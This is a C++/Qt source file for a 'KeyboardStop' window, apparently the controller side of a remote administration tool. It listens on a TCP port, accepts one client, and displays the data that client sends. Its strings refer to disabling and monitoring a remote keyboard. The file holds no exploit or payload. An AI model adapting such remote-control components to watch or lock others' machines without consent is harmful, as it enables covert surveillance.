#include "keyboardstop.h"
#include "zeroclient.h"

KeyboardStop::KeyboardStop(QWidget *parent) : QWidget(parent)
{
    // 初始化窗口
    const int w = 400, h = 300;
    const int x = (QApplication::desktop()->width() - w) >> 1;
    const int y = (QApplication::desktop()->height() - h) >> 1;
    this->setGeometry(x, y, w, h);

    // 设置文本框
    mEdit = new QTextEdit(this);
    mEdit->setGeometry(0,0,w,h);
    mEdit->setReadOnly(true);
}

int KeyboardStop::startKeyboardStopServer(QString userName)
{
    // 设置窗口标题
    this->setWindowTitle(userName.append("-键盘停用"));

    // 开启新的服务端
    mServer = new TcpServer(this);
    connect(mServer,SIGNAL(newConnection(QTcpSocket*)), this,SLOT(newConnection(QTcpSocket*)));

    mServer->start(0);
    if (!mServer->server()->isListening()) {
        qDebug() << "开启键盘监控服务端失败";
        deleteLater();
        return -1;
    }

    // 开启监控窗口
    this->show();

    return mServer->server()->serverPort();
}

void KeyboardStop::newConnection(QTcpSocket *s)
{
    // 新增客户
    mSock = new TcpSocket(s, this);
    connect(mSock,SIGNAL(newData()), this, SLOT(processBuffer()));
    connect(mSock, SIGNAL(disconnected()), this, SLOT(deleteLater()));

    // 不再监听新客户
    mServer->server()->close();
}

void KeyboardStop::processBuffer()
{
    // 将数据打印到文本框
    QString text = mEdit->toPlainText();
    mEdit->setText(text.append(*mSock->buffer()));

    // 清空缓冲区
    mSock->buffer()->clear();
}

void KeyboardStop::resizeEvent(QResizeEvent *)
{
    mEdit->setGeometry(0,0,width(), height());
}

void KeyboardStop::closeEvent(QCloseEvent *)
{
    // 删除窗口
    deleteLater();
}
